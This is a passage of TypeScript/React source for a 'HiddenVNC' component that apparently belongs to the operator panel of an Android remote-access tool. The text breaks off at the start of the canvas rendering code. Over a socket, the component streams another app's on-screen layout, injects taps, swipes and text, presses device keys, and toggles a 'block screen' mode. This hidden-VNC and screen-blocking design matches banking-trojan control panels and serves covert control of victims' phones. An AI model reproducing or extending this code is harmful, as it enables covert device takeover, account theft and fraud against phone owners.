"use client";

import { AndroidDevice } from "@/types";
import { useState, useEffect, useRef, useCallback } from "react";
import { createPortal } from "react-dom";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Switch } from "@/components/ui/switch";
import { EyeOff, Power, RotateCcw, Loader2, X, Maximize2, Minimize2, Eye, ArrowLeft, Home, Lock, Volume2, Volume1, GripVertical, ArrowUp, ArrowDown, ArrowRight, Mic, MicOff, Unlock, Send } from "lucide-react";
import { io, Socket } from "socket.io-client";

interface HiddenVNCProps {
  device: AndroidDevice;
  showContent?: boolean;
  onViewSelect?: (view: string | null) => void;
  triggerOpen?: number;
}

interface SkeletonEntry {
  text: string;
  type: string;
  x: number;
  y: number;
  width: number;
  height: number;
}

interface SkeletonData {
  package: string;
  device_width: number;
  device_height: number;
  skeleton: SkeletonEntry[];
}

// Color mapping for different view types - vibrant neon colors for better visibility
const getViewTypeBorderColor = (type: string, index: number): string => {
  // Use type-based colors for consistency, with vibrant neon shades
  const typeColorMap: Record<string, string> = {
    text: "#dc2626",           // Deep red
    button: "#34d399",         // Bright green
    edit: "#fbbf24",           // Bright yellow
    imageview: "#60a5fa",      // Bright blue
    framelayout: "#a78bfa",    // Bright purple
    viewgroup: "#fb923c",      // Bright orange
    view: "#22d3ee",           // Bright cyan
  };
  
  const typeLower = type.toLowerCase();
  
  // Return type-specific color if available, otherwise cycle through vibrant colors
  if (typeColorMap[typeLower]) {
    return typeColorMap[typeLower];
  }
  
  // Fallback: cycle through vibrant colors
  const colors = [
    "#60a5fa", // Bright blue
    "#dc2626", // Deep red
    "#34d399", // Bright green
    "#fbbf24", // Bright yellow
  ];
  
  return colors[index % 4];
};

export default function HiddenVNC({ device, showContent = true, onViewSelect, triggerOpen = 0 }: HiddenVNCProps) {
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [skeletonData, setSkeletonData] = useState<SkeletonData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [currentPackage, setCurrentPackage] = useState<string>("");
  const [isDragging, setIsDragging] = useState(false);
  const [position, setPosition] = useState({ x: 100, y: 100 });
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
  const [isMinimized, setIsMinimized] = useState(false);
  const [mounted, setMounted] = useState(false);
  const [phoneWidth, setPhoneWidth] = useState(320);
  const [screenHeight, setScreenHeight] = useState<number | null>(null);
  const [isResizing, setIsResizing] = useState(false);
  const resizeStartRef = useRef<{ width: number; x: number } | null>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const socketRef = useRef<Socket | null>(null);
  const animationFrameRef = useRef<number | null>(null);
  const popupRef = useRef<HTMLDivElement>(null);
  const titleBarRef = useRef<HTMLDivElement>(null);
  const resizeHandleRef = useRef<HTMLDivElement>(null);
  const lastTriggerRef = useRef<number>(0);
  const hasAutoConnectedRef = useRef<boolean>(false);
  const [isAutoConnecting, setIsAutoConnecting] = useState(false);
  
  // Control panel state
  const [showArrowKeys, setShowArrowKeys] = useState(false);
  const [textInput, setTextInput] = useState("");
  const [isMuted, setIsMuted] = useState(false);
  const [isLocked, setIsLocked] = useState(false);
  const [blockScreenEnabled, setBlockScreenEnabled] = useState(false);
  
  // Swipe detection state
  const swipeStartRef = useRef<{ x: number; y: number; time: number } | null>(null);
  const isSwipeActiveRef = useRef(false);

  const DEVICE_SERVER_URL = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";


  useEffect(() => {
    setMounted(true);
    // Don't auto-open on mount - only open when button is clicked
  }, []);

  // Automatically open popup when triggerOpen changes (when Hidden VNC button is clicked)
  useEffect(() => {
    // Only open if triggerOpen is a new value (increased) and popup is not already open
    if (triggerOpen > 0 && triggerOpen !== lastTriggerRef.current) {
      if (!isPopupOpen) {
        lastTriggerRef.current = triggerOpen;
        setIsPopupOpen(true);
        setIsMinimized(false);
        hasAutoConnectedRef.current = false; // Reset auto-connect flag when opening
        // Center the popup on screen
        setPosition({
          x: (window.innerWidth - 600) / 2,
          y: (window.innerHeight - 600) / 2,
        });
      } else {
        // Popup is already open, just update the ref to track this trigger
        lastTriggerRef.current = triggerOpen;
      }
    }
  }, [triggerOpen, isPopupOpen]);

  // Auto-connect when popup opens (but wait to see if data is already coming)
  useEffect(() => {
    if (isPopupOpen && !isConnected && !hasAutoConnectedRef.current && !isLoading) {
      console.log("🔌 [HiddenVNC] Waiting to check if data is already streaming...");
      setIsAutoConnecting(true);
      // Wait 3 seconds to see if data is already coming before sending connect command
      const timer = setTimeout(() => {
        // Check again if we're still not connected (data might have arrived in the meantime)
        if (!isConnected && !hasAutoConnectedRef.current) {
          hasAutoConnectedRef.current = true;
          console.log("🔌 [HiddenVNC] No data received after 3 seconds, auto-connecting...");
          setIsLoading(true);
          setIsConnected(true);

          // Send start-skeleton command via socket
          if (socketRef.current && socketRef.current.connected) {
            console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
            
            socketRef.current.emit("send-command", {
              deviceId: device.id,
              command: "access-command",
              param: "start-skeleton",
              payload: {},
            });
            
            console.log("✅ [HiddenVNC] Auto-connect command sent via socket");
            setIsLoading(false);
          } else {
            console.error("❌ [HiddenVNC] Socket not connected for auto-connect");
            setIsLoading(false);
            setIsConnected(false);
          }
        } else {
          console.log("🔌 [HiddenVNC] Data already streaming, skipping connect command");
        }
      }, 3000);
      
      return () => {
        console.log("🔌 [HiddenVNC] Cleaning up auto-connect timer");
        clearTimeout(timer);
        setIsAutoConnecting(false);
      };
    } else if (isConnected || hasAutoConnectedRef.current) {
      setIsAutoConnecting(false);
    }
  }, [isPopupOpen, isConnected, isLoading, device.id]);

  // Calculate initial screen height based on phone width
  useEffect(() => {
    if (!skeletonData) {
      // Default device dimensions
      const deviceWidth = 1080;
      const deviceHeight = 2400;
      const deviceAspectRatio = deviceWidth / deviceHeight;
      
      // Calculate screen width (phoneWidth - padding - bezel)
      const screenWidth = phoneWidth - 12;
      const calculatedHeight = Math.round(screenWidth / deviceAspectRatio);
      setScreenHeight(calculatedHeight);
    }
  }, [phoneWidth, skeletonData]);

  // Handle dragging
  const handleMouseDown = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    if (!titleBarRef.current || !popupRef.current) return;
    
    const rect = popupRef.current.getBoundingClientRect();
    setDragOffset({
      x: e.clientX - rect.left,
      y: e.clientY - rect.top,
    });
    setIsDragging(true);
  }, []);

  useEffect(() => {
    let rafId: number | null = null;
    
    const handleMouseMove = (e: MouseEvent) => {
      if (!isDragging || !popupRef.current) return;

      // Cancel any pending animation frame
      if (rafId !== null) {
        cancelAnimationFrame(rafId);
      }

      // Use requestAnimationFrame for smooth updates
      rafId = requestAnimationFrame(() => {
        if (!popupRef.current) return;
        
        const newX = e.clientX - dragOffset.x;
        const newY = e.clientY - dragOffset.y;

        // Keep popup within viewport bounds
        const maxX = window.innerWidth - popupRef.current.offsetWidth;
        const maxY = window.innerHeight - popupRef.current.offsetHeight;

        setPosition({
          x: Math.max(0, Math.min(newX, maxX)),
          y: Math.max(0, Math.min(newY, maxY)),
        });
      });
    };

    const handleMouseUp = () => {
      setIsDragging(false);
      if (rafId !== null) {
        cancelAnimationFrame(rafId);
        rafId = null;
      }
    };

    if (isDragging) {
      document.addEventListener("mousemove", handleMouseMove);
      document.addEventListener("mouseup", handleMouseUp);
    }

    return () => {
      document.removeEventListener("mousemove", handleMouseMove);
      document.removeEventListener("mouseup", handleMouseUp);
      if (rafId !== null) {
        cancelAnimationFrame(rafId);
      }
    };
  }, [isDragging, dragOffset]);

  // Handle resize
  const handleResizeStart = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    e.preventDefault();
    e.stopPropagation();
    resizeStartRef.current = {
      width: phoneWidth,
      x: e.clientX,
    };
    setIsResizing(true);
  }, [phoneWidth]);

  useEffect(() => {
    const handleResizeMove = (e: MouseEvent) => {
      if (!isResizing || !resizeStartRef.current) return;

      const deltaX = e.clientX - resizeStartRef.current.x;
      const newWidth = resizeStartRef.current.width + deltaX;
      
      // Constrain resize between 300px and 800px
      const constrainedWidth = Math.max(300, Math.min(800, newWidth));
      setPhoneWidth(constrainedWidth);
    };

    const handleResizeEnd = () => {
      setIsResizing(false);
      resizeStartRef.current = null;
    };

    if (isResizing) {
      document.addEventListener("mousemove", handleResizeMove);
      document.addEventListener("mouseup", handleResizeEnd);
    }

    return () => {
      document.removeEventListener("mousemove", handleResizeMove);
      document.removeEventListener("mouseup", handleResizeEnd);
    };
  }, [isResizing]);

  const handleOpenPopup = () => {
    setIsPopupOpen(true);
    setIsMinimized(false);
    // Center the popup on screen
    setPosition({
      x: (window.innerWidth - 600) / 2,
      y: (window.innerHeight - 600) / 2,
    });
  };

  // Center popup after it's first rendered
  useEffect(() => {
    if (isPopupOpen && popupRef.current && !isMinimized) {
      requestAnimationFrame(() => {
        if (popupRef.current) {
          const rect = popupRef.current.getBoundingClientRect();
          const centerX = (window.innerWidth - rect.width) / 2;
          const centerY = (window.innerHeight - rect.height) / 2;
          setPosition({ x: Math.max(0, centerX), y: Math.max(0, centerY) });
        }
      });
    }
  }, [isPopupOpen]);

  const handleClosePopup = () => {
    console.log("handleClosePopup called, closing popup");
    // Close popup immediately using functional update to ensure state change
    setIsPopupOpen((prev) => {
      console.log("Setting isPopupOpen to false, previous value:", prev);
      return false;
    });
    setIsConnected(false);
    setIsLoading(false);
    setIsAutoConnecting(false);
    setSkeletonData(null);
    hasAutoConnectedRef.current = false;
    // Navigate back to home page when popup is closed (delay to ensure popup closes first)
    if (onViewSelect) {
      setTimeout(() => {
        onViewSelect(null);
      }, 100);
    }
  };

  // Setup Socket.IO connection for receiving skeleton-result events
  useEffect(() => {
    if (!isPopupOpen) return;
    
    console.log(`🔌 [HiddenVNC] Setting up socket for device: ${device.id}`);
    
    if (!socketRef.current) {
      const socket = io(DEVICE_SERVER_URL, {
        transports: ["websocket", "polling"],
      });

      socket.on("connect", () => {
        console.log("✅ [HiddenVNC] Socket connected");
      });

      socket.on("device_event", (event: any) => {
        console.log("📨 [HiddenVNC] Received device event:", event.event, "for device:", event.device_id);
        
        if (event.event === "skeleton_result" && event.device_id === device.id) {
          console.log("🎯 [HiddenVNC] Skeleton result received:", event.data);
          
          // If we receive data, mark as connected and cancel auto-connect
          if (!isConnected) {
            console.log("✅ [HiddenVNC] Data is already streaming, marking as connected");
            setIsConnected(true);
            setIsLoading(false);
            hasAutoConnectedRef.current = true; // Prevent auto-connect from triggering
          }
          
          try {
            // Parse the skeleton data
            let parsedSkeleton: SkeletonEntry[] = [];
            
            if (typeof event.data.skeleton === "string") {
              console.log("📝 [HiddenVNC] Skeleton is a string, parsing...");
              parsedSkeleton = JSON.parse(event.data.skeleton);
            } else if (Array.isArray(event.data.skeleton)) {
              console.log("📝 [HiddenVNC] Skeleton is already an array");
              parsedSkeleton = event.data.skeleton;
            }
            
            console.log(`✅ [HiddenVNC] Parsed ${parsedSkeleton.length} skeleton entries`);
            
            const newSkeletonData = {
              package: event.data.package || "",
              device_width: event.data.device_width || 1080,
              device_height: event.data.device_height || 2400,
              skeleton: parsedSkeleton,
            };
            
            setSkeletonData(newSkeletonData);
            setCurrentPackage(event.data.package || "");
            setIsLoading(false);
          } catch (error) {
            console.error("❌ [HiddenVNC] Error parsing skeleton data:", error);
            setIsLoading(false);
          }
        }
      });

      socket.on("disconnect", () => {
        console.log("❌ [HiddenVNC] Socket disconnected");
      });

      socketRef.current = socket;
    }

    return () => {
      if (socketRef.current) {
        console.log("🔌 [HiddenVNC] Cleaning up socket");
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, [device.id, DEVICE_SERVER_URL, isPopupOpen]);

  const handleConnect = async () => {
    console.log("🔌 [HiddenVNC] Connecting...");
    
    if (!socketRef.current || !socketRef.current.connected) {
      console.error("❌ [HiddenVNC] Socket not connected");
      setIsLoading(false);
      setIsConnected(false);
      return;
    }

    setIsLoading(true);
    setIsConnected(true);

    try {
      // Send start-skeleton command via socket
      console.log(`📤 [HiddenVNC] Sending start-skeleton command to device: ${device.id}`);
      
      socketRef.current.emit("send-command", {
        deviceId: device.id,
        command: "access-command",
        param: "start-skeleton",
        payload: {},
      });

      console.log("✅ [HiddenVNC] start-skeleton command sent via socket");
    } catch (error) {
      console.error("❌ [HiddenVNC] Error sending start-skeleton command:", error);
      setIsLoading(false);
      setIsConnected(false);
    }
  };

  const handleDisconnect = async () => {
    console.log("🔌 [HiddenVNC] Disconnecting...");
    
    try {
      // Send stop-skeleton command via socket
      if (socketRef.current && socketRef.current.connected) {
        console.log(`📤 [HiddenVNC] Sending stop-skeleton command to device: ${device.id}`);
        
        socketRef.current.emit("send-command", {
          deviceId: device.id,
          command: "access-command",
          param: "stop-skeleton",
          payload: {},
        });
        
        console.log("✅ [HiddenVNC] stop-skeleton command sent via socket");
      } else {
        console.warn("⚠️ [HiddenVNC] Socket not connected, skipping stop-skeleton command");
      }
    } catch (error) {
      console.error("❌ [HiddenVNC] Error sending stop-skeleton command:", error);
    }
    
    // Close popup and clean up
    setIsConnected(false);
    setIsLoading(false);
    setIsAutoConnecting(false);
    setSkeletonData(null);
    hasAutoConnectedRef.current = false;
    setIsPopupOpen(false);
    
    // Navigate back to home page
    if (onViewSelect) {
      setTimeout(() => {
        onViewSelect(null);
      }, 100);
    }
  };

  const handleRefresh = async () => {
    console.log("🔄 [HiddenVNC] Refreshing...");
    
    if (!socketRef.current || !socketRef.current.connected) {
      console.error("❌ [HiddenVNC] Socket not connected for refresh");
      setIsLoading(false);
      setIsConnected(false);
      return;
    }
    
    // Reset states first
    setIsLoading(true);
    setSkeletonData(null);
    
    // Disconnect first, then reconnect
    try {
      // Send stop-skeleton command first via socket
      socketRef.current.emit("send-command", {
        deviceId: device.id,
        command: "access-command",
        param: "stop-skeleton",
        payload: {},
      });
      
      // Wait a bit before reconnecting
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Now reconnect
      await handleConnect();
    } catch (error) {
      console.error("❌ [HiddenVNC] Error during refresh:", error);
      setIsLoading(false);
      setIsConnected(false);
    }
  };

  const sendDeviceCommand = async (command: string, payload: any = {}) => {
    if (!socketRef.current) {
      console.error("❌ [HiddenVNC] Socket not initialized");
      return;
    }

    if (!socketRef.current.connected) {
      console.error("❌ [HiddenVNC] Socket not connected. Current state:", socketRef.current.connected);
      return;
    }

    if (!isConnected) {
      console.error("❌ [HiddenVNC] Device not connected");
      return;
    }

    try {
      // Extract param from payload if it exists
      const { param, ...restPayload } = payload;
      
      const commandData = {
        deviceId: device.id,
        command: command,
        ...(param && { param: param }), // Include param at top level if it exists
        payload: restPayload, // Include remaining payload fields
      };

      console.log(`📤 [HiddenVNC] Sending command:`, commandData);
      console.log(`📤 [HiddenVNC] Command: ${command}, Param: ${param || 'none'}`);
      
      socketRef.current.emit("send-command", commandData);
      
      console.log(`✅ [HiddenVNC] Command emitted: ${command}`, { param, payload: restPayload });
    } catch (error) {
      console.error(`❌ [HiddenVNC] Error sending command ${command}:`, error);
    }
  };

  // Android keycode constants
  const KEYCODE_BACK = 4;
  const KEYCODE_HOME = 3;
  const KEYCODE_APP_SWITCH = 187;
  const KEYCODE_POWER = 26;
  const KEYCODE_VOLUME_UP = 24;
  const KEYCODE_VOLUME_DOWN = 25;

  const handleBack = useCallback(() => {
    console.log("🔘 [HiddenVNC] Back button clicked");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) {
      console.error("❌ [HiddenVNC] Cannot send command - not connected");
      return;
    }
    sendDeviceCommand("access-command", {
      param: "btnback",
      payload: { 
        button: "back",
        keycode: KEYCODE_BACK
      },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleHome = useCallback(() => {
    console.log("🔘 [HiddenVNC] Home button clicked");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) {
      console.error("❌ [HiddenVNC] Cannot send command - not connected");
      return;
    }
    sendDeviceCommand("access-command", {
      param: "btnhome",
      payload: { 
        button: "home",
        keycode: KEYCODE_HOME
      },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleRecent = useCallback(() => {
    console.log("🔘 [HiddenVNC] Recent button clicked");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) {
      console.error("❌ [HiddenVNC] Cannot send command - not connected");
      return;
    }
    sendDeviceCommand("access-command", {
      param: "btnrecent",
      payload: { 
        button: "recent",
        keycode: KEYCODE_APP_SWITCH
      },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleLock = useCallback(() => {
    console.log("🔘 [HiddenVNC] Lock button clicked");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) {
      console.error("❌ [HiddenVNC] Cannot send command - not connected");
      return;
    }
    sendDeviceCommand("access-command", {
      param: "btnlock",
      payload: { 
        button: "lock",
        keycode: KEYCODE_POWER
      },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleVolumeUp = useCallback(() => {
    console.log("🔘 [HiddenVNC] Volume Up button clicked");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) {
      console.error("❌ [HiddenVNC] Cannot send command - not connected");
      return;
    }
    sendDeviceCommand("access-command", {
      param: "btnvolumeup",
      payload: { 
        button: "volume-up",
        keycode: KEYCODE_VOLUME_UP
      },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleVolumeDown = useCallback(() => {
    console.log("🔘 [HiddenVNC] Volume Down button clicked");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) {
      console.error("❌ [HiddenVNC] Cannot send command - not connected");
      return;
    }
    sendDeviceCommand("access-command", {
      param: "btnvolumedown",
      payload: { 
        button: "volume-down",
        keycode: KEYCODE_VOLUME_DOWN
      },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  // Arrow key handlers
  const handleArrowUp = useCallback(() => {
    console.log("⬆️ [HiddenVNC] Arrow Up pressed");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: "btnarrowup",
      payload: { button: "arrow_up", keycode: 19 },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleArrowDown = useCallback(() => {
    console.log("⬇️ [HiddenVNC] Arrow Down pressed");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: "btnarrowdown",
      payload: { button: "arrow_down", keycode: 20 },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleArrowLeft = useCallback(() => {
    console.log("⬅️ [HiddenVNC] Arrow Left pressed");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: "btnarrowleft",
      payload: { button: "arrow_left", keycode: 21 },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  const handleArrowRight = useCallback(() => {
    console.log("➡️ [HiddenVNC] Arrow Right pressed");
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: "btnarrowright",
      payload: { button: "arrow_right", keycode: 22 },
    });
  }, [device.id, isConnected, sendDeviceCommand]);

  // Text input handler
  const handleSendText = useCallback(() => {
    if (!textInput.trim()) return;
    console.log("📝 [HiddenVNC] Sending text:", textInput);
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: `pastetext|${textInput}`,
      payload: { button: "text", text: textInput },
    });
    setTextInput("");
  }, [textInput, device.id, isConnected, sendDeviceCommand]);

  // Mute/Unmute handler
  const handleToggleMute = useCallback(() => {
    const newMuteState = !isMuted;
    setIsMuted(newMuteState);
    console.log(`🔇 [HiddenVNC] ${newMuteState ? 'Muting' : 'Unmuting'}`);
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: newMuteState ? "btnmute" : "btnunmute",
      payload: { button: newMuteState ? "mute" : "unmute", keycode: 164 },
    });
  }, [isMuted, device.id, isConnected, sendDeviceCommand]);

  // Lock/Unlock toggle handler
  const handleToggleLock = useCallback(() => {
    const newLockState = !isLocked;
    setIsLocked(newLockState);
    console.log(`🔐 [HiddenVNC] ${newLockState ? 'Locking' : 'Unlocking'}`);
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: newLockState ? "btnlock" : "btnunlock",
      payload: { button: newLockState ? "lock" : "unlock", keycode: KEYCODE_POWER },
    });
  }, [isLocked, device.id, isConnected, sendDeviceCommand]);

  // Block Screen toggle handler
  const handleBlockScreenToggle = useCallback((checked: boolean) => {
    setBlockScreenEnabled(checked);
    const param = checked ? "enable-block-screen|text" : "disable-block-screen|text";
    console.log(`🚫 [HiddenVNC] ${checked ? 'Enabling' : 'Disabling'} block screen`);
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    sendDeviceCommand("access-command", {
      param: param,
      payload: { blockScreen: checked },
    });
  }, [isConnected, device.id, sendDeviceCommand]);

  // Convert canvas coordinates to device coordinates
  const canvasToDeviceCoords = useCallback((canvasX: number, canvasY: number) => {
    if (!canvasRef.current || !skeletonData) return { x: 0, y: 0 };
    
    const canvas = canvasRef.current;
    
    // Get device dimensions
    const deviceWidth = skeletonData.device_width || 1080;
    const deviceHeight = skeletonData.device_height || 2400;
    
    // Calculate UI chrome dimensions (EXACT same as in render logic)
    const statusBarHeight = Math.round(canvas.height * 0.04);
    const navBarHeight = Math.round(canvas.height * 0.06);
    const screenStartY = statusBarHeight;
    const screenHeight = canvas.height - statusBarHeight - navBarHeight;
    
    // Calculate scale factors (same as in render logic)
    const scaleX = canvas.width / deviceWidth;
    const scaleY = screenHeight / deviceHeight;
    const uniformScale = Math.min(scaleX, scaleY);
    
    // Convert canvas coordinates to device coordinates
    const deviceX = Math.round(canvasX / uniformScale);
    const deviceY = Math.round((canvasY - screenStartY) / uniformScale);
    
    // Clamp to device bounds
    return { 
      x: Math.max(0, Math.min(deviceX, deviceWidth - 1)), 
      y: Math.max(0, Math.min(deviceY, deviceHeight - 1)) 
    };
  }, [skeletonData]);

  // Emit swipe-detected event to server
  const emitSwipeDetected = useCallback((
    startX: number,
    startY: number,
    endX: number,
    endY: number,
    duration: number
  ) => {
    if (!socketRef.current || !socketRef.current.connected) return;
    
    const deltaX = endX - startX;
    const deltaY = endY - startY;
    const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
    
    // Determine direction
    const absDeltaX = Math.abs(deltaX);
    const absDeltaY = Math.abs(deltaY);
    let direction = "unknown";
    
    if (absDeltaX > absDeltaY) {
      direction = deltaX > 0 ? "right" : "left";
    } else {
      direction = deltaY > 0 ? "down" : "up";
    }
    
    // Check for diagonal swipes
    if (absDeltaX > 0 && absDeltaY > 0) {
      const ratio = absDeltaX / absDeltaY;
      if (ratio > 0.5 && ratio < 2) {
        if (deltaX > 0 && deltaY > 0) direction = "down-right";
        else if (deltaX > 0 && deltaY < 0) direction = "up-right";
        else if (deltaX < 0 && deltaY > 0) direction = "down-left";
        else direction = "up-left";
      }
    }
    
    const velocity = duration > 0 ? distance / duration : 0;
    
    // Emit swipe-detected event from web client (this will be received by device-server.js)
    socketRef.current.emit("swipe-detected-web", {
      deviceId: device.id,
      startX,
      startY,
      endX,
      endY,
      duration,
      direction,
      distance,
      velocity,
    });
    
    console.log(`👆 [HiddenVNC] Swipe detected: ${direction}`, {
      from: `(${startX}, ${startY})`,
      to: `(${endX}, ${endY})`,
      distance: Math.round(distance),
      duration,
    });
  }, [device.id]);

  // Emit click-detected event to server
  const emitClickDetected = useCallback((
    x: number,
    y: number,
    duration: number
  ) => {
    if (!socketRef.current || !socketRef.current.connected) return;
    
    // Emit click-detected event from web client (this will be received by device-server.js)
    socketRef.current.emit("click-detected-web", {
      deviceId: device.id,
      x,
      y,
      duration,
      timestamp: new Date().toISOString(),
    });
    
    console.log(`👆 [HiddenVNC] Click detected:`, {
      at: `(${x}, ${y})`,
      duration,
    });
  }, [device.id]);

  // Handle canvas touch/mouse start
  const handleCanvasStart = useCallback((clientX: number, clientY: number) => {
    if (!canvasRef.current || !isConnected || !skeletonData) return;
    
    const canvas = canvasRef.current;
    const rect = canvas.getBoundingClientRect();
    
    // Account for CSS scaling - convert CSS display coordinates to canvas pixel coordinates
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    
    // Convert client coordinates to canvas pixel coordinates
    const canvasX = (clientX - rect.left) * scaleX;
    const canvasY = (clientY - rect.top) * scaleY;
    
    // Store swipe start position and time
    swipeStartRef.current = {
      x: canvasX,
      y: canvasY,
      time: Date.now(),
    };
    isSwipeActiveRef.current = true;
    
    console.log("👆 [HiddenVNC] Swipe start:", { 
      canvasX, 
      canvasY, 
      clientX, 
      clientY,
      rectWidth: rect.width,
      rectHeight: rect.height,
      canvasWidth: canvas.width,
      canvasHeight: canvas.height,
      scaleX,
      scaleY
    });
  }, [isConnected, skeletonData]);

  // Handle canvas touch/mouse end (complete swipe)
  const handleCanvasEnd = useCallback((clientX: number, clientY: number) => {
    if (!canvasRef.current || !isConnected || !skeletonData || !swipeStartRef.current) {
      isSwipeActiveRef.current = false;
      swipeStartRef.current = null;
      return;
    }
    
    const canvas = canvasRef.current;
    const rect = canvas.getBoundingClientRect();
    
    // Account for CSS scaling - convert CSS display coordinates to canvas pixel coordinates
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    
    // Clamp client coordinates to canvas bounds (using CSS dimensions)
    const clampedClientX = Math.max(rect.left, Math.min(clientX, rect.left + rect.width));
    const clampedClientY = Math.max(rect.top, Math.min(clientY, rect.top + rect.height));
    
    // Convert CSS coordinates to canvas pixel coordinates
    const endCanvasX = (clampedClientX - rect.left) * scaleX;
    const endCanvasY = (clampedClientY - rect.top) * scaleY;
    
    // Ensure canvas coordinates are within bounds
    const validEndCanvasX = Math.max(0, Math.min(endCanvasX, canvas.width));
    const validEndCanvasY = Math.max(0, Math.min(endCanvasY, canvas.height));
    
    const start = swipeStartRef.current;
    const duration = Date.now() - start.time;
    
    // Calculate swipe distance using valid coordinates
    const deltaX = validEndCanvasX - start.x;
    const deltaY = validEndCanvasY - start.y;
    const distance = Math.sqrt(deltaX * deltaX + deltaY * deltaY);
    
    // Convert canvas coordinates to device coordinates
    const deviceStart = canvasToDeviceCoords(start.x, start.y);
    const deviceEnd = canvasToDeviceCoords(validEndCanvasX, validEndCanvasY);
    
    // Final validation: ensure device coordinates are non-negative
    const finalDeviceStart = {
      x: Math.max(0, deviceStart.x),
      y: Math.max(0, deviceStart.y),
    };
    const finalDeviceEnd = {
      x: Math.max(0, deviceEnd.x),
      y: Math.max(0, deviceEnd.y),
    };
    
    // Determine if it's a click (small movement) or swipe (larger movement)
    const CLICK_THRESHOLD = 10; // pixels
    
    console.log("👆 [HiddenVNC] Swipe end:", {
      canvasStart: { x: start.x, y: start.y },
      canvasEnd: { x: validEndCanvasX, y: validEndCanvasY },
      deviceStart: finalDeviceStart,
      deviceEnd: finalDeviceEnd,
      distance,
      duration
    });
    
    if (distance <= CLICK_THRESHOLD) {
      // It's a click/tap
      console.log("👆 [HiddenVNC] Detected as click");
      sendDeviceCommand("access-command", {
        param: `click|${finalDeviceStart.x}|${finalDeviceStart.y}`,
      });
      
      // Emit click-detected event
      emitClickDetected(
        finalDeviceStart.x,
        finalDeviceStart.y,
        duration
      );
    } else {
      // It's a swipe
      const swipeDuration = Math.max(100, Math.min(duration, 1000)); // Clamp between 100ms and 1000ms
      
      console.log("👆 [HiddenVNC] Detected as swipe");
      sendDeviceCommand("access-command", {
        param: `swipe|${finalDeviceStart.x}|${finalDeviceStart.y}|${finalDeviceEnd.x}|${finalDeviceEnd.y}|${swipeDuration}`,
      });
      
      // Emit swipe-detected event
      emitSwipeDetected(
        finalDeviceStart.x,
        finalDeviceStart.y,
        finalDeviceEnd.x,
        finalDeviceEnd.y,
        swipeDuration
      );
    }
    
    // Reset swipe tracking
    isSwipeActiveRef.current = false;
    swipeStartRef.current = null;
  }, [isConnected, skeletonData, canvasToDeviceCoords, emitSwipeDetected, emitClickDetected, sendDeviceCommand]);

  // Mouse event handlers
  const handleCanvasMouseDown = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    handleCanvasStart(e.clientX, e.clientY);
  }, [handleCanvasStart]);

  const handleCanvasMouseMove = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
    // Track mouse move during swipe (no action needed, just tracking)
  }, []);

  const handleCanvasMouseUp = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    handleCanvasEnd(e.clientX, e.clientY);
  }, [handleCanvasEnd]);

  // Touch event handlers
  const handleCanvasTouchStart = useCallback((e: React.TouchEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    if (e.touches.length > 0) {
      const touch = e.touches[0];
      handleCanvasStart(touch.clientX, touch.clientY);
    }
  }, [handleCanvasStart]);

  const handleCanvasTouchMove = useCallback((e: React.TouchEvent<HTMLCanvasElement>) => {
    // Track touch move during swipe (no action needed, just tracking)
    e.preventDefault();
  }, []);

  const handleCanvasTouchEnd = useCallback((e: React.TouchEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    if (e.changedTouches.length > 0) {
      const touch = e.changedTouches[0];
      handleCanvasEnd(touch.clientX, touch.clientY);
    }
  }, [handleCanvasEnd]);

  // Render skeleton on canvas
  useEffect(() => {
    if (!skeletonData || !canvasRef.current || !containerRef.current || !isConnected) {
      return;
    }

    console.log("🎨 [HiddenVNC] Starting render with skeleton data:", {
      package: skeletonData.package,
      device_width: skeletonData.device_width,
      device_height: skeletonData.device_height,
      skeleton_length: skeletonData.skeleton.length,
      skeleton_is_array: Array.isArray(skeletonData.skeleton)
    });

